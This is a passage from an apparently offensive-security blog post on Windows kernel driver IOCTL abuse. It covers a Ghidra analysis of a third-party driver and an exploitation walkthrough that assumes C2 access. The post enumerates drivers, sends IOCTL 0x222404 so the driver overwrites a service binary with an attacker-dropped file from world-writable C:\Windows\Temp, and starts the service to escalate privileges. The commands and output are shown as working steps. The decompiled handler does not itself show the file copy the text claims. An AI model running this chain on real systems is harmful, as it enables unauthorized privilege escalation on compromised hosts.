</span></span><span style="display:flex"><span>                 <span style="color:#a5d6ff">"Not enough slots for processes, provided pid count is %d"</span>);
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>from the above snippet, the function prints the current process count, checks if there’s enough space to be allocated for the process list, and sets an error code (<code>0xc0000023 - STATUS_BUFFER_TOO_SMALL</code>) if there’s not enough space.</p><p>using the import table, you can trace back calls to interesting or important functions:</p><ul><li><p><code>NTOSKRNL.EXE</code>: standard functions.</p></li><li><p><code>FLTMGR.SYS</code>: interacting with minifilters.</p></li><li><p><code>FWPKCLNT.SYS</code>: Windows Filtering Platform.</p></li><li><p><code>KSECDD.SYS</code>: cryptography.</p></li><li><p><code>NETIO.SYS</code>: Winsock Kernel (WSK).</p></li><li><p><code>CLFS.SYS</code>: logging.</p></li><li><p><code>MSRPC.SYS</code>: RPC.</p></li><li><p><code>WDFLDR.SYS</code>: indicated whether a driver is KMDF.</p></li><li><p><code>CI.DLL</code>: authenticate code integrity.</p></li><li><p><code>HAL.DLL</code>: hardware abstraction layer.</p></li></ul><p></p><p class="imgp"><img loading="lazy" src="https://bsssq.xyz/importable.png" alt="imports"></p><p></p><p>function names in <code>NTOSKRNL</code> are prefixed with a 2-3 character type indicating which subsystem the routine belongs to. for example:</p><ul><li><code>Ex</code>: executive.</li><li><code>Io</code>: I/O manager.</li><li><code>Ke</code>: kernel scheduling/synchronization.</li><li><code>Mm</code>: memory manager.</li><li><code>Ob</code>: object manager.</li><li><code>Ps</code>: process/thread manager.</li><li><code>Rtl</code>: runtime library.</li><li><code>Zw</code>: native API calls.</li></ul><h3 id="sending-an-irp">sending an IRP</h3><p>so, to make a successful request to the driver all you’ll need is:</p><ul><li><p>the name of the symlink.</p></li><li><p>any access restrictions.</p></li><li><p>the IOCTL.</p></li><li><p>the type of data expected in the input buffer.</p></li><li><p>the amount (length) of data expected in the output buffer.</p></li></ul><p>a client application needs to be written to send this request, with everything centering around a call to <code>CreateFile</code> and <code>DeviceIoControl</code>. <a href="https://github.com/jerome-pouiller/ioctl" target="_blank" rel="noreferrer nofollow">several</a>
<a href="https://github.com/koutto/ioctlbf" target="_blank" rel="noreferrer nofollow">such</a>
<a href="https://github.com/jthuraisamy/ioctlpus?tab=readme-ov-file" target="_blank" rel="noreferrer nofollow">clients</a>
already exist, but you can write your own too!</p><p>to receive output from the driver, it’s important to note that the function being targeted may return data that you’d like to work with. this could be application data, a kernel handle, system information, etc.</p><p>by including an output buffer large enough to receive the data in the call to <code>DeviceIoControl</code>, you can get data back, though it could prove cumbersome if dealing with output data of an unknown size.</p><p>if <code>IpBytesReturned</code> are in the set, you can check how much data will be required and then send the IRP again with the resized buffer.</p><p>once you get the output, treat it as any other datatype and parse it, before passing it to another function or casting it to another type.</p><h2 id="exploitation">exploitation</h2><p>this exploitation is designed to be carried out in a C2 setting, and assumes that initial foothold and access has been achieved. you’ll also need to have your own tools, one for enumerating the drivers and one for sending the IOCTL to the driver.</p><h3 id="identification">identification</h3><p>the first thing is to identify the drivers that are currently running. during an engagement or operation, you’ll want to filter out the drivers published by Microsoft. this is because their drivers are far less likely to contain vulnerabilities, and it would behoove us to focus on third-party drivers.</p><p>using a custom driver enumeration tool (written in C#), you can first register the assembly in a callback (inside your C2) and then execute it.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="display:flex"><span>execute_assembly DriverQuery.exe -no-msft
</span></span></code></pre></div><p>a bunch of drivers appear in the output, but i’m interested in this one.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="display:flex"><span>Service Name: drvsvc
</span></span><span style="display:flex"><span>Path: C:<span style="color:#79c0ff">\W</span>indows<span style="color:#79c0ff">\S</span>ystem32<span style="color:#79c0ff">\d</span>rivers<span style="color:#79c0ff">\e</span>dr.sys
</span></span><span style="display:flex"><span>Version: -
</span></span><span style="display:flex"><span>Creation Time <span style="color:#ff7b72;font-weight:700">(</span>UTC<span style="color:#ff7b72;font-weight:700">)</span>: 3/18/2024 8:55:03 PM
</span></span><span style="display:flex"><span>Cert Issuer: <span style="color:#79c0ff">CN</span><span style="color:#ff7b72;font-weight:700">=</span><span style="color:#a5d6ff">"WDKCert bmand,13244737085124I074"</span>
</span></span><span style="display:flex"><span>Signer: <span style="color:#79c0ff">CN</span><span style="color:#ff7b72;font-weight:700">=</span><span style="color:#a5d6ff">"WDKCert bmand,13244737085124I074"</span>
</span></span></code></pre></div><p>download this to your host, where you can analyze it in ghidra.</p><h3 id="analysis">analysis</h3><p>remember to import the <code>NTDDK</code> types into ghidra and apply them (<code>apply function data types</code>).</p><p>to determine if the driver object is restricted to admins only, you’ll need to look through the imports from <code>ntoskrnl.exe</code> for a call to <code>IoCreateDevice</code>. luckily, it exists, meaning we can talk to the driver as any user on the system.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span>local_18[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0x140012</span>;
</span></span><span style="display:flex"><span>uVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">IoCreateDevice</span>(param_1, <span style="color:#a5d6ff">0</span>, (PUNICODE_STRING)local_28, <span style="color:#a5d6ff">0x22</span>, <span style="color:#a5d6ff">0x100</span>, <span style="color:#a5d6ff">'0'</span>, local_res18);
</span></span><span style="display:flex"><span>uVar3 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">CONCAT44</span>(extraout_var, uVar1);
</span></span></code></pre></div><p>then, to find out if any IOCTLs are supported by the driver, look through the exported <code>entry</code> function for a value assigned to <code>param_1-&gt;MajorFunction[0xe]</code>. this is the offset to the IRP handler.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#ff7b72">else</span> {
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72;font-weight:700">*</span>(code <span style="color:#ff7b72;font-weight:700">**</span>)<span style="color:#ff7b72;font-weight:700">&amp;</span>param_1<span style="color:#ff7b72;font-weight:700">-&gt;</span>DriverUnload <span style="color:#ff7b72;font-weight:700">=</span> FUN_14000l0d0;
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72;font-weight:700">*</span>(code <span style="color:#ff7b72;font-weight:700">**</span>)param_1<span style="color:#ff7b72;font-weight:700">-&gt;</span>MajorFunction <span style="color:#ff7b72;font-weight:700">=</span> FUN_140001440;
</span></span><span style="display:flex"><span>    param_1<span style="color:#ff7b72;font-weight:700">-&gt;</span>MajorFunction[<span style="color:#a5d6ff">2</span>] <span style="color:#ff7b72;font-weight:700">=</span> (PDRIVER_DISPATCH)<span style="color:#a5d6ff">0x14000l</span><span style="color:#a5d6ff">440</span>;
</span></span><span style="display:flex"><span>    param_1<span style="color:#ff7b72;font-weight:700">-&gt;</span>MajorFunction[<span style="color:#a5d6ff">0xe</span>] <span style="color:#ff7b72;font-weight:700">=</span> (PDRIVER_DISPATCH)<span style="color:#a5d6ff">0x140001460</span>;
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>the offset value here is <code>0x140001460</code>. clicking it will jump into the IRP handler.</p><p>stepping through the IRP handler, it’s possible to identify all the IOCTLs supported. variables set from <code>param_2-&gt;Tail + 0x40 + 0x18</code> or <code>param_2-&gt;Tail.field_0x40 + 0x18</code> are IOCTLs.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span>ulonglong <span style="color:#d2a8ff;font-weight:700">FUN_14000l460</span>(undefined8 param_1, PIRP param_2)
</span></span><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">int</span> iVar1;
</span></span><span style="display:flex"><span>    longlong lVar2;
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:700">*</span>_Dst;
</span></span><span style="display:flex"><span>    ulonglong uVar3;
</span></span><span style="display:flex"><span>    ulonglong _Size;
</span></span><span style="display:flex"><span>    ulonglong uVar4;
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>    uVar3 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex"><span>    uVar4 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">do</span> {
</span></span><span style="display:flex"><span>        _Size <span style="color:#ff7b72;font-weight:700">=</span> uVar4 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">1</span>;
</span></span><span style="display:flex"><span>        lVar2 <span style="color:#ff7b72;font-weight:700">=</span> uVar4 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">1</span>;
</span></span><span style="display:flex"><span>        uVar4 <span style="color:#ff7b72;font-weight:700">=</span> _Size;
</span></span><span style="display:flex"><span>    } <span style="color:#ff7b72">while</span> (<span style="color:#a5d6ff">"check passed."</span>[lVar2] <span style="color:#ff7b72;font-weight:700">!=</span> <span style="color:#a5d6ff">'\0'</span>);
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>    lVar2 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#ff7b72;font-weight:700">*</span>(longlong <span style="color:#ff7b72;font-weight:700">*</span>)<span style="color:#ff7b72;font-weight:700">&amp;</span>(param_2<span style="color:#ff7b72;font-weight:700">-&gt;</span>Tail).field_0x40;
</span></span><span style="display:flex"><span>    iVar1 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#ff7b72;font-weight:700">*</span>(<span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:700">*</span>)(lVar2 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">0x18</span>);
</span></span><span style="display:flex"><span>    
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">if</span> (iVar1 <span style="color:#ff7b72;font-weight:700">==</span> <span style="color:#a5d6ff">0x222400</span>) {
</span></span><span style="display:flex"><span>        <span style="color:#d2a8ff;font-weight:700">DbgPrint</span>(<span style="color:#a5d6ff">"%s</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">"</span>, <span style="color:#a5d6ff">"second verification passed."</span>, param_1);
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">else</span> {
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">if</span> (iVar1 <span style="color:#ff7b72;font-weight:700">==</span> <span style="color:#a5d6ff">0x222404</span>) {
</span></span><span style="display:flex"><span>            uVar3 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#d2a8ff;font-weight:700">FUN_140001118</span>();
</span></span><span style="display:flex"><span>            uVar3 <span style="color:#ff7b72;font-weight:700">=</span> uVar3 <span style="color:#ff7b72;font-weight:700">&amp;</span> <span style="color:#a5d6ff">0xffffffff</span>;
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72">else</span> {
</span></span><span style="display:flex"><span>            <span style="color:#ff7b72">if</span> (iVar1 <span style="color:#ff7b72;font-weight:700">==</span> <span style="color:#a5d6ff">0x222408</span>) {
</span></span><span style="display:flex"><span>                _Dst <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#ff7b72;font-weight:700">*</span>(<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:700">**</span>)(<span style="color:#ff7b72;font-weight:700">*</span>(longlong <span style="color:#ff7b72;font-weight:700">*</span>)param_2<span style="color:#ff7b72;font-weight:700">-&gt;</span>AssociatedIrp <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">4</span>);
</span></span><span style="display:flex"><span>                uVar3 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex"><span>                <span style="color:#ff7b72">if</span> (_Dst <span style="color:#ff7b72;font-weight:700">!=</span> (<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:700">*</span>)<span style="color:#a5d6ff">0x0</span>) {
</span></span><span style="display:flex"><span>                    <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:700">*</span>(uint <span style="color:#ff7b72;font-weight:700">*</span>)(lVar2 <span style="color:#ff7b72;font-weight:700">+</span> <span style="color:#a5d6ff">8</span>) <span style="color:#ff7b72;font-weight:700">&lt;</span> _Size) {
</span></span><span style="display:flex"><span>                        uVar3 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0xc0000023</span>;
</span></span><span style="display:flex"><span>                    }
</span></span><span style="display:flex"><span>                    <span style="color:#ff7b72">else</span> {
</span></span><span style="display:flex"><span>                        <span style="color:#d2a8ff;font-weight:700">memcpy</span>(_Dst, <span style="color:#a5d6ff">"boot completed"</span>, _Size);
</span></span><span style="display:flex"><span>                        (param_2<span style="color:#ff7b72;font-weight:700">-&gt;</span>IoStatus).Information <span style="color:#ff7b72;font-weight:700">=</span> _Size;
</span></span><span style="display:flex"><span>                    }
</span></span><span style="display:flex"><span>                }
</span></span><span style="display:flex"><span>            }
</span></span><span style="display:flex"><span>            <span style="color:#ff7b72">else</span> {
</span></span><span style="display:flex"><span>                (param_2<span style="color:#ff7b72;font-weight:700">-&gt;</span>IoStatus).Information <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex"><span>                <span style="color:#ff7b72;font-weight:700">*</span>(undefined4 <span style="color:#ff7b72;font-weight:700">*</span>)<span style="color:#ff7b72;font-weight:700">&amp;</span>(param_2<span style="color:#ff7b72;font-weight:700">-&gt;</span>IoStatus).u.Status <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0xc00000bb</span>;
</span></span><span style="display:flex"><span>                uVar3 <span style="color:#ff7b72;font-weight:700">=</span> <span style="color:#a5d6ff">0xc00000bb</span>;
</span></span><span style="display:flex"><span>            }
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>    <span style="color:#ff7b72">return</span> uVar3;
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>based on the above, when the driver receives the IOCTL <code>0x222404</code>, it performs a copy operation, overwriting <code>C:\Windows\System32\UpdateInitializer.exe</code> with the file at <code>C:\Windows\Temp\UpdateInitializer.exe</code>.</p><p>using <code>powerpick</code>, it was found that this file is registered as a service.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="display:flex"><span>powerpick Get-WmiObject win32_service | ?<span style="color:#ff7b72;font-weight:700">{</span><span style="color:#79c0ff">$_</span>.PathName -like <span style="color:#a5d6ff">"*UpdateInitializer*"</span><span style="color:#ff7b72;font-weight:700">}</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>ExitCode  : <span style="color:#a5d6ff">0</span>
</span></span><span style="display:flex"><span>Name      : UpdateInitializer
</span></span><span style="display:flex"><span>ProcessId : <span style="color:#a5d6ff">0</span>
</span></span><span style="display:flex"><span>StartMode : Manual
</span></span><span style="display:flex"><span>State     : Stopped
</span></span><span style="display:flex"><span>Status    : OK
</span></span></code></pre></div><p>the driver hasn’t performed any validation of the file in the <code>Temp</code> directory, and all users of the system have write access to <code>C:\Windows\Temp</code>, meaning this can be exploited.</p><h3 id="dropping">dropping</h3><p>we can drop a file (<code>.exe</code>) of our choosing to <code>C:\Windows\Temp\UpdateInitializer.exe</code>.</p><p>to send the IOCTL to the driver, it’s basically using a tool similar to <code>DriverQuery.exe</code>, called <code>DriverClient.exe</code>. this was also written in C#.</p><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="display:flex"><span>execute_assembly DriverClient.exe EDR 0x222404
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#ff7b72;font-weight:700">[</span>*<span style="color:#ff7b72;font-weight:700">]</span> Sending IOCTL to EDR. Stand by...
</span></span><span style="display:flex"><span><span style="color:#ff7b72;font-weight:700">[</span>+<span style="color:#ff7b72;font-weight:700">]</span> Sent IOCTL 0x222404. Driver returned <span style="color:#a5d6ff">0</span> bytes.
</span></span></code></pre></div><div class="highlight"><button class="copy-code-button">copy</button><pre tabindex="0" style="color:#c9d1d9;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="display:flex"><span>shell sc start UpdateInitializer
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>SERVICE_NAME: UpdateInitializer
</span></span><span style="display:flex"><span>        TYPE           : <span style="color:#a5d6ff">10</span> WIN32_OWN_PROCESS
</span></span><span style="display:flex"><span>        STATE          : <span style="color:#a5d6ff">2</span> START_PENDING
</span></span><span style="display:flex"><span>        <span style="color:#ff7b72;font-weight:700">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span style="color:#ff7b72;font-weight:700">)</span>
</span></span><span style="display:flex"><span>        WIN32_EXIT_CODE: <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:700">(</span>0x0<span style="color:#ff7b72;font-weight:700">)</span>
</span></span><span style="display:flex"><span>        SERVICE_EXIT_CODE: <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:700">(</span>0x0<span style="color:#ff7b72;font-weight:700">)</span>
</span></span><span style="display:flex"><span>        CHECKPOINT     : 0x0
</span></span><span style="display:flex"><span>        WAIT_HINT      : 0x7d0
</span></span><span style="display:flex"><span>        PID            : <span style="color:#a5d6ff">2660</span>
</span></span><span style="display:flex"><span>        FLAGS          :
</span></span></code></pre></div></main></div></body></html>